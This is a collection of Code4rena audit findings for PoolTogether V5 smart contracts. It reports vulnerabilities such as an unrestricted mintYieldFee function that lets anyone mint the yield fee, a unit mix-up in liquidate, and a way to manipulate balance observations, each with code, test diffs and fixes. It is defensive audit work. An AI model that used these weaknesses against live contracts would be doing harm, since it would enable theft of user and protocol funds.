[{"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/432", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-06"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/hunter_w3b-G.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/429", "labels": ["analysis-advanced", "grade-a", "selected for report", "sponsor confirmed", "A-03"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/0xStalin-Analysis.md)."}, {"title": "`_amountOut` is representing assets and shares at the same time in the `liquidate` function", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/427", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L550-L587   # Vulnerability details  ## Impact  In the `liquidate` function from the `Vault` contract, the input argument `_amountOut` is used as if it was representing a value of asset amount and share amount at the same time which is impossible a there a conversion rate between them, this error will make `liquidate` function behave in an expected manner, not the one that was intended.  ## Proof of Concept  The issue is occurring in the `liquidate` function below :  ```solidity function liquidate(     address _account,     address _tokenIn,     uint256 _amountIn,     address _tokenOut,     uint256 _amountOut ) public virtual override returns (bool) {     _requireVaultCollateralized();     if (msg.sender != address(_liquidationPair))       revert LiquidationCallerNotLP(msg.sender, address(_liquidationPair));     if (_tokenIn != address(_prizePool.prizeToken()))       revert LiquidationTokenInNotPrizeToken(_tokenIn, address(_prizePool.prizeToken()));     if (_tokenOut != address(this))       revert LiquidationTokenOutNotVaultShare(_tokenOut, address(this));     if (_amountOut == 0) revert LiquidationAmountOutZero();          uint256 _liquidableYield = _liquidatableBalanceOf(_tokenOut);          // @audit _amountOut compared with _liquidableYield which represents an asset amount     // @audit _amountOut is considered as an asset amount     if (_amountOut > _liquidableYield)       revert LiquidationAmountOutGTYield(_amountOut, _liquidableYield);          _prizePool.contributePrizeTokens(address(this), _amountIn);          if (_yieldFeePercentage != 0) {         // @audit _amountOut used to increase fee shares so considered as representing a share amount         _increaseYieldFeeBalance(             (_amountOut * FEE_PRECISION) / (FEE_PRECISION - _yieldFeePercentage) - _amountOut         );     }          uint256 _vaultAssets = IERC20(asset()).balanceOf(address(this));          // @audit _amountOut compared with _vaultAssets which represents an asset amount     // @audit _amountOut is considered as an asset amount     if (_vaultAssets != 0 && _amountOut >= _vaultAssets) {       _yieldVault.deposit(_vaultAssets, address(this));     }          // @audit _amountOut representing a share amount minted to the _account     _mint(_account, _amountOut);          return true; } ```  As you can see from the code above, the value of the argument `_amountOut` is used multiple times in the function logic and each time it is representing either an asset amount or a share amount which is impossible as there a conversion formula used to transform asset amount into share amount (and inversely) with the function `_convertToShares` (or `_convertToAssets`).   From the function comments i couldn't figure out what the value of `_amountOut` actually represents, but because there is also another argument given to the `liquidate` function which is `_tokenOut == address(this)`, I'm supposing that `_amountOut` is representing a share amount which will mean that all the instances highlighted in the code above when `_amountOut` is considered as an asset amount are wrong.  * Instance 1 :  ```solidity // @audit _amountOut compared with _liquidableYield which represents an asset amount if (_amountOut > _liquidableYield)   revert LiquidationAmountOutGTYield(_amountOut, _liquidableYield); ```  * Instance 2 :  ```solidity // @audit _amountOut compared with _vaultAssets which represents an asset amount if (_vaultAssets != 0 && _amountOut >= _vaultAssets) {   _yieldVault.deposit(_vaultAssets, address(this)); } ```  And before comparing `_amountOut` to the asset amount values : `_vaultAssets` and `_liquidableYield`, its value should be converted to an asset amount with the function `_convertToAssets`.  This issue will cause problems for the protocol working as the `liquidate` function logic will not behave as expected (because it's comparing values that represents different things).  ** Note : if `_amountOut` is actually representing an asset amount (not a share amount as i supposed), the issue is still valid because `_amountOut` is also used as being a share amount inside the `liquidate` function, in that case it should first be converted to a share amount with `_convertToShares` in order to get the correct behavior of the `liquidate` function.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  To solve this issue i recommend to first convert the value of `_amountOut` in the `liquidate` function to an asset amount and store it in a local variable `_amountOutToAsset`, and in the function logic use the correct variable (either `_amountOut` or `_amountOutToAsset`) when interacting with a share amount or an asset amount.   ## Assessed type  Error"}, {"title": "In a scenario with unexpectedly many prizes, the auction will fail to adjust", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/424", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-03"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L137-L140   # Vulnerability details  ## Impact The protocol utilizes [Gradual Dutch Auctions](https://www.paradigm.xyz/2022/08/vrgda) to determine the price paid to claimants. In the original paper, the number of assets owned is known in advance, enabling the auction to precisely adjust prices based on demand. However, the number of prices in the PoolTogether pool is stochastic, which can lead to pricing discrepancies when the actual number deviates significantly from the expected number.   ## Proof of Concept  The formula to derive the reward the claimer receives for getting an auction is   auction prize = p * e^(t - n / r)  , where t is the time passed, n is the number of claims and r is the expected number of claims per second. When the number of claims is right on target then t = n / r, so we sell at the target price p. When we have claimed a larger number of units n then expected, then t << n / r, so the prize will significantly drop below the target prize.  The auction price drops below the gas fees, so many prizes will remain unclaimed.  ## Tools Used Manual review, VS Code  ## Recommended Mitigation Steps  With a large number of tiers, users and vault the probability of a large deviation [is small](https://en.wikipedia.org/wiki/Law_of_large_numbers).  For a small number of tiers, we should calculate the *maximum* number of prizes that will appear with a high probability (i.e. a number of draws that is not exceeded in 99.9% of the cases). We call this number the `limitPrizeCount`. We use the limit to estimate the maximum number of units drawn per second instead of the average number of units drawn:  ```diff SD59x18 perTimeUnit = LinearVRGDALib.getPerTimeUnit( -    prizePool.estimatedPrizeCount(), +    prizePool.limitPrizeCount()      timeToReachMaxFee     ); ```      ## Assessed type  Other"}, {"title": "In important libraries of PoolTogether, the pow() function of PRBMath is used, which exhibits inconsistent return values", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/423", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-07"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  - https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/DrawAccumulatorLib.sol#L406-L407 - https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/libraries/TierCalculationLib.sol#L26   # Vulnerability details  The `DrawAccumulatorLib.sol` and `TierCalculationLib.sol` libraries inherit a version of `PRBMath` that contains a critical vulnerability in the `pow()` function, which can return inconsistent values. This vulnerability is of great importance to the PoolTogether protocol, as the `pow()` function is used in the computation of `TierCalculationLib.getTierOdds` and `DrawAccumulatorLib.computeC`. Recently, another protocol has also experienced the same bug, and the creators of the `PRBMath` have acknowledged this situation. Here is the corresponding [link](https://github.com/sablier-labs/v2-core/pull/432). Due to time constraints, we were unable to thoroughly address certain rounding errors with `mul` and `div` functions of SD59x18. However, these errors have been corrected in PRBMath [V4](https://github.com/PaulRBerg/prb-math/releases/tag/v4.0.0).  ## Impact PRBMath `pow()` function can return inconsistent values  ## Proof of Concept [Proof of the bug acknowledgment by the creator of the PRBMath](https://github.com/sablier-labs/v2-core/pull/432)  `This PR makes four significant changes:` - Upgrades to PRBMath v4, which contains the fix for https://github.com/cantinasec/sablier/issues/2 and https://github.com/cantinasec/sablier/issues/1. - Bumps all other submodules to their most recent versions. - Increases the minimum Solidity pragma to v0.8.19, since this is a requirement of PRBMath V4.  ## Tools Used Manual review  ## Recommended Mitigation Steps To mitigate this issue, please update the contracts to `0.8.19` and upgrade the `PRBMath` to version `V4`.   ## Assessed type  Math"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/422", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-04"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/catellatech-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/420", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-04"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/catellatech-Analysis.md)."}, {"title": "High Prizes might not be claimed", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/415", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-09"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L210 https://github.com/GenerationSoftware/pt-v5-claimer/blob/57a381aef690a27c9198f4340747155a71cae753/src/Claimer.sol#L173   # Vulnerability details  ## Impact PoolTogether V5 delegates the task of claiming the prizes to a network of `Claimers` that are incentivized to claim prizes for a share of the prize won. The fees the Claimant receives is calculated based on an Dutch Auction, but the limited by the minimum prize of the price pool  fee = min( fee in auction, % maxFeePortionOfPrize * minPrize)  When the gas costs exceed the `minPrize` the solver has not incentives to claim the price.  Notice that the number of prizes only adjusts *after* very few prizes are claimed.  ## Proof of Concept Gas prices rise well above the `minPrize`. The highest prize is suddenly drawn that day. The solvers have no incentive to claim the prize and the winner does not monitor the contract. As a result, no one claims the top prize. The protocol suffers a loss of reputation.  ## Tools Used Manual review, VS Code  ## Recommended Mitigation Steps The problem is that the incentives are not exactly aligned. The user is willing to pay anything up to his price p to receive his price.  But the maximum that the solvers receives is the minimum price. We can align the two incentives by using each user's price as an upper bound.  ```diff function _computeMaxFee(uint8 _tier, uint8 _numTiers) internal view returns (uint256) {     uint8 _canaryTier = _numTiers - 1;     if (_tier != _canaryTier) {       // canary tier -     return _computeMaxFee(prizePool.getTierPrizeSize(_canaryTier - 1)); +   return _computeMaxFee(prizePool.getTierPrizeSize(_tier));  } else {       return _computeMaxFee(prizePool.getTierPrizeSize(_canaryTier));     }   }  ```  Since we already validate the inputs in [`claimPrize`](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L417-L419) the attacker can not claim more than the prize is worth.     ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/410", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-08"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/alymurtazamemon-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/405", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-05"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/dirk_y-Analysis.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/401", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-08"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/alymurtazamemon-G.md)."}, {"title": "PrizePool -> Winners wouldn't be able to claim prize correctly in `claimPrize` function ", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/399", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/abstract/TieredLiquidityDistributor.sol#L476   # Vulnerability details  ## Impact In `PrizePool.sol` vaults can call `claimPrize()` function to claim prizes for winners. The `claimPrize` calls `_getTier(_tier, numberOfTiers)` function to get back the **prizeSize** but there is a problem in [`_getTier`](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/abstract/TieredLiquidityDistributor.sol#L471) function, lets see: ```solidity   function _getTier(uint8 _tier, uint8 _numberOfTiers) internal view returns (Tier memory) {     Tier memory tier = _tiers[_tier];     uint16 _lastClosedDrawId = lastClosedDrawId;     if (tier.drawId != _lastClosedDrawId) {       tier.drawId = _lastClosedDrawId;       tier.prizeSize = uint96(         _computePrizeSize(           _tier,           _numberOfTiers,           fromUD34x4toUD60x18(tier.prizeTokenPerShare),           fromUD34x4toUD60x18(prizeTokenPerShare)         )       );     }     return tier;   } ``` As you can see it calls `_computePrizeSize` function and downcast the returned result but since it returns `uint256` by downcasting it to `uint96` it's possible to result in incorrect number if the value overflow (When downcasting from one type to another, Solidity will not revert but overflows). So this means there is possibilty `prizeSize` value result in incorrect prize size and vaults can't claim the prizes correctly for winners.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Check whether the result of `prizeSize` exceeds `type(uint96).max` or not, if so revert the tx. I recommend to use [SafeCast](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol) by OpenZeppelin for casting diffrent types safely.  I also found some other downcastings in the code base but since they or pegged to vault share values and you already check for overflows, there is no problem.   ## Assessed type  Under/Overflow"}, {"title": "`Vault.mintYieldFee` FUNCTION CAN BE CALLED BY ANYONE TO MINT `Vault Shares` TO ANY RECIPIENT ADDRESS", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/396", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L394-L402   # Vulnerability details  ## Impact The `Vault.mintYieldFee` external function is used to mint `Vault shares` to the yield fee `_recipient`. The function is an external function and can be called by anyone since there is no access control. The function will revert only under following two conditions:  1. if the Vault is undercollateralized 2. if the `_shares` are greater than the accrued `_yieldFeeTotalSupply`.  The issue with this function is it allows the caller to set the `_recipient` (Address of the yield fee recipient). It does not use the `_yieldFeeRecipient` state variable which was set in the `Vault.constructor` as the `yield fee recipient`.  Which means any one can steal the available `yield fee` from this vault (As long as above two revert conditions are not satisfied) by `minting shares` to his own address or to any address of his choice.   ## Proof of Concept  ```solidity   function mintYieldFee(uint256 _shares, address _recipient) external {     _requireVaultCollateralized();     if (_shares > _yieldFeeTotalSupply) revert YieldFeeGTAvailable(_shares, _yieldFeeTotalSupply);      _yieldFeeTotalSupply -= _shares;     _mint(_recipient, _shares);      emit MintYieldFee(msg.sender, _recipient, _shares);   } ```  https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L394-L402  ## Tools Used Manual Review and VSCode  ## Recommended Mitigation Steps  Hence it is recommended to use the `_yieldFeeRecipient` state variable value as the `yield fee recipient` inside the `Vault.mintYieldFee` external function and to remove the input parameter `address _recipient` from the `Vault.mintYieldFee` function. So that the caller will not be able to mint shares to any arbitory address of his choice and steal the yield fee of the protocol.  The updated function should be as follows:  ```solidity   function mintYieldFee(uint256 _shares) external {     _requireVaultCollateralized();     if (_shares > _yieldFeeTotalSupply) revert YieldFeeGTAvailable(_shares, _yieldFeeTotalSupply);      _yieldFeeTotalSupply -= _shares;     _mint(_yieldFeeRecipient, _shares);      emit MintYieldFee(msg.sender, _recipient, _shares);   }  ```   ## Assessed type  Other"}, {"title": "`Vault.mintWithPermit()` can be DOSed ", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/384", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/tree/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L466-L469 https://github.com/GenerationSoftware/pt-v5-vault/tree/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L971-L974 https://github.com/GenerationSoftware/pt-v5-vault/tree/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L882-L887   # Vulnerability details  ## Impact `Vault.mintWithPermit()` uses a signature to approve the underlying asset. But the asset amount can be changed easily, so this method can be reverted and might be DoSed.  ## Proof of Concept `Vault.mintWithPermit()` gets the share amount as an input and calculates the asset amount from the share. And then approves the asset amount with `permit` method.   ```solidity     uint256 _assets = _beforeMint(_shares, _receiver);      _permit(IERC20Permit(asset()), msg.sender, address(this), _assets, _deadline, _v, _r, _s);     _deposit(msg.sender, _receiver, _assets, _shares); ```  The signature is generated using the exact value of the expected asset amount calculated from the share amount, and the resulting asset amount depends on the exchange rate of current vault.  ```solidity   function _beforeMint(uint256 _shares, address _receiver) internal view returns (uint256) {     if (_shares > maxMint(_receiver)) revert MintMoreThanMax(_receiver, _shares, maxMint(_receiver));     return _convertToAssets(_shares, Math.Rounding.Up);   } ``` ```solidity   function _convertToAssets(     uint256 _shares,     Math.Rounding _rounding   ) internal view virtual override returns (uint256) {     return _convertToAssets(_shares, _currentExchangeRate(), _rounding);   } ```  So the resulting asset amount can be different from the value of transaction start time. And even an adversary can front-run and manipulate the exchange rate. If the resulting asset amount is different from the original one, the signature will not work as expected and `mintWithPermit()` will revert in most cases.  ## Tools Used Manual Review  ## Recommended Mitigation Steps We can input upper bound of the asset amount instead of the exact value of the asset amount.   ## Assessed type  DoS"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/355", "labels": ["analysis-advanced", "grade-a", "sponsor confirmed", "A-06"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/DadeKuma-Analysis.md)."}, {"title": "Tier odds in TieredLiquidityDistributor are incorrect", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/352", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-12"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/abstract/TieredLiquidityDistributor.sol#L83-L200   # Vulnerability details  ## Impact The following points are stated in the docs:  1. The highest standard prize tier is the most common prize: occurring every single draw. 2. The canary tier has odds of occurring daily (as if it were the highest tier)  Therefore, both the highest standard tier and the canary tier should have odds of 1, however at the moment only the canary tier has odds of 1. The result is that the protocol is not distributing prizes as intended.  ## Proof of Concept The issue with the odds calculations can be seen in the `TieredLiquidityDistributor.sol` contract. Below is a short snippet for the tier odds when there are 3 tiers:  ```   SD59x18 internal constant TIER_ODDS_0_3 = SD59x18.wrap(2739726027397260);   SD59x18 internal constant TIER_ODDS_1_3 = SD59x18.wrap(52342392259021369);   SD59x18 internal constant TIER_ODDS_2_3 = SD59x18.wrap(1000000000000000000); ```  The canary tier odds are 1 as intended, however the highest normal prize tier odds are incorrect. If the tier odds were being calculated correctly, we should see the last two odds for each number of tiers being 1 (i.e. `1000000000000000000`).  ## Tools Used Manual review  ## Recommended Mitigation Steps Since the `TierCalculationLib.getTierOdds` only seems to be used by the `GenerateConstants` script, I suggest modifying the script used to generate the constants that are placed in `TieredLiquidityDistributor.sol`:  ``` diff --git a/script/generateConstants.s.sol b/script/generateConstants.s.sol index fe1d4ed..fb9f90a 100644 --- a/script/generateConstants.s.sol +++ b/script/generateConstants.s.sol @@ -38,16 +38,24 @@ contract GenerateConstants is Script {      MAX_TIERS = 15;      // Precompute the odds for each tier      for (uint8 numTiers = MIN_TIERS; numTiers <= MAX_TIERS; numTiers++) { -      for (uint8 tier = 0; tier < numTiers; tier++) { +      for (uint8 tier = 0; tier < numTiers - 1; tier++) {          console.log(            \"SD59x18 internal constant TIER_ODDS_%d_%d = SD59x18.wrap(%d);\",            uint256(tier),            uint256(numTiers),            uint256( -            SD59x18.unwrap(TierCalculationLib.getTierOdds(tier, numTiers, GRAND_PRIZE_PERIOD_DRAWS)) +            SD59x18.unwrap(TierCalculationLib.getTierOdds(tier, numTiers - 1, GRAND_PRIZE_PERIOD_DRAWS))            )          );        } +      console.log( +          \"SD59x18 internal constant TIER_ODDS_%d_%d = SD59x18.wrap(%d);\", +          uint256(numTiers - 1), +          uint256(numTiers), +          uint256( +            SD59x18.unwrap(TierCalculationLib.getTierOdds(numTiers - 1, numTiers, GRAND_PRIZE_PERIOD_DRAWS)) +          ) +        );      }    }  }  ```   ## Assessed type  Math"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/340", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-07"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/squeaky_cactus-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/338", "labels": ["analysis-advanced", "grade-b", "sponsor confirmed", "A-08"], "target": "2023-07-pooltogether-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-07-pooltogether-findings/blob/main/data/K42-Analysis.md)."}, {"title": "Users can manipulate observation creation", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/334", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-13"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/libraries/TwabLib.sol#L352-L391   # Vulnerability details  ## Impact Users can alter the record of their balances.  ## Proof of Concept If users delegateBalance has changed, observations will be recorded. If there is a need for new observation, new observation will be created otherwise will be overwritten.  And new observation creation will be decided in the _getNextObservationIndex() function.  ```solidity if (currentPeriod == 0 || currentPeriod > newestObservationPeriod) {       return (         uint16(RingBufferLib.wrap(_accountDetails.nextObservationIndex, MAX_CARDINALITY)),         newestObservation,         true       );     } ```  newestObservationPeriod is the last observations period. currentPeriod is a period that calculated with uint32 currentTime = uint32(block.timestamp).  ```solidity uint32 currentPeriod = _getTimestampPeriod(PERIOD_LENGTH, PERIOD_OFFSET, currentTime);     uint32 newestObservationPeriod = _getTimestampPeriod(       PERIOD_LENGTH,       PERIOD_OFFSET,       newestObservation.timestamp     ); ```  ```solidity function _getTimestampPeriod(     uint32 PERIOD_LENGTH,     uint32 PERIOD_OFFSET,     uint32 _timestamp   ) private pure returns (uint32 period) {     if (_timestamp <= PERIOD_OFFSET) {       return 0;     }     // Shrink by 1 to ensure periods end on a multiple of PERIOD_LENGTH.     // Increase by 1 to start periods at # 1.     return ((_timestamp - PERIOD_OFFSET - 1) / PERIOD_LENGTH) + 1;   } ```  The problem is, If someone deposits a small amount frequently, currentPeriod and newestObservationPeriod will always be the same and new observation won't be created. Attackers can keep doing this until closeDraw and manipulate their balances.  According to the docs : If a draw were to start and end within a period a user would be able to alter the record of their balance for that draw by overwriting an Observation.  It is important to note that due to Observation overwriting, average balances for a period are not finalized until a period ends. Therefore if a draw ends but a period has not, a user would be able to manipulate their average balance for that final period of time after the draw ends. This would result in an inaccurate record of their balance held during the draw.  ## Tools Used Manual Review ## Recommended Mitigation Steps         ## Assessed type  Other"}, {"title": "Number of prize tiers always increases if just 1 canary prize is claimed", "html_url": "https://github.com/code-423n4/2023-07-pooltogether-findings/issues/332", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-07-pooltogether-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L361 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L446-L448 https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/4bc8a12b857856828c018510b5500d722b79ca3a/src/PrizePool.sol#L781-L810   # Vulnerability details  ## Impact As mentioned in the docs, \"The Canary Tier is a special prize tier that receives a smaller amount of prize liquidity. The Canary Tier informs the Prize Pool as to whether it's worth increasing the number of prize tiers. The canary tier's role is to let us know whether it's worth offering n+1 tiers of prizes\".  The intended behaviour is that the number of tiers only increase if a high enough portion of both the highest non-canary tier prizes and the canary tier prizes are claimed, so that prizes scale with demand and liquidity. However, there is a bug that causes the number of tiers to increase if at least 1 canary prize is claimed. Therefore it is highly likely that it will take just 12 draws to reach the cap of 15 prize tiers (or an attacker could force the situation by claiming canary prizes), at which point the prize sizes will be broken based on the liquidity provided and the protocol will become almost unusable.  ## Proof of Concept When a draw has finished/elapsed, the draw manager closes the draw by calling `closeDraw`. During this closing process the next number of tiers is computed:  ``` _nextNumberOfTiers = _computeNextNumberOfTiers(_numTiers); ```  Before we dive into this computation, it's worth exploring the `claimPrize` method. Whenever a prize is claimed there is a `largestTierClaimed` state variable that is set to the highest tier that has been claimed for (which can include the canary tier):  ```     if (largestTierClaimed < _tier) {       largestTierClaimed = _tier;     } ```  Now, the issue titled in this report exists because of how the next number of tiers is calculated in the `_computeNextNumberOfTiers` function:  ``` function _computeNextNumberOfTiers(uint8 _numTiers) internal view returns (uint8) {     UD2x18 _claimExpansionThreshold = claimExpansionThreshold;      uint8 _nextNumberOfTiers = largestTierClaimed + 2; // canary tier, then length     _nextNumberOfTiers = _nextNumberOfTiers > MINIMUM_NUMBER_OF_TIERS       ? _nextNumberOfTiers       : MINIMUM_NUMBER_OF_TIERS;      if (_nextNumberOfTiers >= MAXIMUM_NUMBER_OF_TIERS) {       return MAXIMUM_NUMBER_OF_TIERS;     }      // check to see if we need to expand the number of tiers     if (       _nextNumberOfTiers >= _numTiers &&       canaryClaimCount >=       fromUD60x18(         intoUD60x18(_claimExpansionThreshold).mul(_canaryPrizeCountFractional(_numTiers).floor())       ) &&       claimCount >=       fromUD60x18(         intoUD60x18(_claimExpansionThreshold).mul(toUD60x18(_estimatedPrizeCount(_numTiers)))       )     ) {       // increase the number of tiers to include a new tier       _nextNumberOfTiers = _numTiers + 1;     }      return _nextNumberOfTiers;   } ```  For the sake of argument let's say the prize pool had 3 tiers, so the canary tier is tier 2. If there is at least 1 canary tier prize that has been claimed for the previous draw then `largestTierClaimed = 2` and therefore `_nextNumberOfTiers = 4`. What's interesting here is that even if the check to expand the number of tiers fails, we still return `_nextNumberOfTiers` which has just been set to 4. So we're expanding the number of tiers even if the claim count isn't higher than the claim expansion thresholds.  I have made a tiny change to the existing test suite to demonstrate that the number of tiers will increase with just 1 canary prize claim. It can be executed with `forge test -vvv --match-path test/PrizePool.t.sol`:  ``` diff --git a/test/PrizePool.t.sol b/test/PrizePool.t.sol index 45d8606..36063eb 100644 --- a/test/PrizePool.t.sol +++ b/test/PrizePool.t.sol @@ -561,25 +561,12 @@ contract PrizePoolTest is Test {    function testCloseAndOpenNextDraw_expandingTiers() public {      contribute(1e18);      closeDraw(1234); -    mockTwab(address(this), address(this), 0); -    claimPrize(address(this), 0, 0); -    mockTwab(address(this), sender1, 1); -    claimPrize(sender1, 1, 0); -    mockTwab(address(this), sender2, 1); -    claimPrize(sender2, 1, 0); -    mockTwab(address(this), sender3, 1); -    claimPrize(sender3, 1, 0); -    mockTwab(address(this), sender4, 1); -    claimPrize(sender4, 1, 0); + +    // Just 1 canary prize tier claim increases the number of tiers        // canary tiers      mockTwab(address(this), sender5, 2);      claimPrize(sender5, 2, 0); -    mockTwab(address(this), sender6, 2); -    claimPrize(sender6, 2, 0); - -    vm.expectEmit(); -    emit DrawClosed(2, 245, 3, 4, 7997159090909503, UD34x4.wrap(7357954545454530000), prizePool.lastClosedDrawEndedAt());        closeDraw(245);      assertEq(prizePool.numberOfTiers(), 4);  ```  ## Tools Used Manual review + foundry  ## Recommended Mitigation Steps The `_computeNextNumberOfTiers` logic should be updated to the below:  ``` diff --git a/src/PrizePool.sol b/src/PrizePool.sol index a42a27e..016124a 100644 --- a/src/PrizePool.sol +++ b/src/PrizePool.sol @@ -791,19 +791,22 @@ contract PrizePool is TieredLiquidityDistributor {      }        // check to see if we need to expand the number of tiers -    if ( -      _nextNumberOfTiers >= _numTiers && -      canaryClaimCount >= -      fromUD60x18( -        intoUD60x18(_claimExpansionThreshold).mul(_canaryPrizeCountFractional(_numTiers).floor()) -      ) && -      claimCount >= -      fromUD60x18( -        intoUD60x18(_claimExpansionThreshold).mul(toUD60x18(_estimatedPrizeCount(_numTiers))) -      ) -    ) { -      // increase the number of tiers to include a new tier -      _nextNumberOfTiers = _numTiers + 1; +    if (_nextNumberOfTiers > _numTiers) { +      if (canaryClaimCount >= +        fromUD60x18( +          intoUD60x18(_claimExpansionThreshold).mul(_canaryPrizeCountFractional(_numTiers).floor()) +        ) && +        claimCount >= +        fromUD60x18( +          intoUD60x18(_claimExpansionThreshold).mul(toUD60x18(_estimatedPrizeCount(_numTiers))) +        ) +      ) { +        // increase the number of tiers to include a new tier +        return _numTiers + 1; +      } +      else { +        return 